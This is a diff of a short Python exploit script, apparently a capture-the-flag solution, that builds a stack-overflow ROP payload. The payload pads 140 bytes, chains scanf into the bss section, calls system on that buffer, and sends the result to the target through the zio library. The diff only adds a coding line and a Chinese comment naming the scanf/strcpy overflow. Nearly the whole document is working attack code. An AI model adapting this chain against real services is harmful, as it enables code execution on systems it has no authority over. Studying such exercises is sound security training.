@@ -1,3 +1,5 @@
+# coding:utf-8
+# scanf读入后 strcpy导致栈溢出
 # 基础ROP，有system函数
 
 from zio import *
@@ -23,6 +25,7 @@ addesp_156 = 0x80487a7
 _s = 0x0804888F
 
 buf = 'A'*140 + p32(scanf_addr) + p32(pop2ret) + p32(_s) + p32(bss_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)
+
 
 io.read_until_timeout()
 io.writeline(buf)
